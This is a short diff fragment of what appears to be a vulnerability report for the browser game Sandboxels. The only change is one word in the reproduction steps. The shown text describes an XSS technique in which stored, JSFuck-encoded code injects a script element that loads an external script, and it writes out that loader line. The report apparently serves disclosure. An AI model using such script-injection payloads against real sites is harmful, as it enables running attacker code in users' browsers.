@@ -26,7 +26,7 @@ Since the initiator code can't contain lowercase letters, a tool like [JSFuck](h
 3. The attacker uses a `<p>` (or any other text-based tag) with an id of 1 to store the rest of the code. This code will be used to load an external script: `let a=document['createElement']('script');a.src='URL';document.head.append(a)`. Since this code will be turned into lowercase, it can't contain any uppercase characters, so a tool like JSFuck should be used to change any code that might contain such characters (such as 'createElement' in this case). That also mean that the URL can't contain such characters either.
 
 ### Steps to reproduce
-1. Use the Prop tool in Sandboxels
+1. Select the Prop tool in Sandboxels
 2. Paste the code from `initiator.js` into browser's console
 3. Use the Prop tool on some pixels
 4. Hover over those pixels
